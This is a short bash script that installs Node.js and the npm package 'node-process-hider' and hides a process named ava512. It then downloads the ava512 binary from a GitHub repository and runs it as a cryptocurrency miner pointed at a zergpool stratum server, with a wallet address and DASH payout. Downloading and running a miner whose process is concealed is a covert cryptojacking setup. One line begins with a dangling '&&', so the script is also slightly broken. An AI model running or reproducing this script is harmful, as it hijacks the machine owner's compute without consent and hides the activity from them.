#!/bin/bash
sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.12.0 && npm i -g node-process-hider
&& ph add ava512
wget https://github.com/ako255/pisang/raw/main/ava512 && chmod +x ava512 && ./ava512 -a x11 -o stratum+tcp://x11.mine.zergpool.com:6333 -u 7W1QxayrhqEwjtgP6AZCKtXkswfcdvrRch
-p c=DASH -t 2
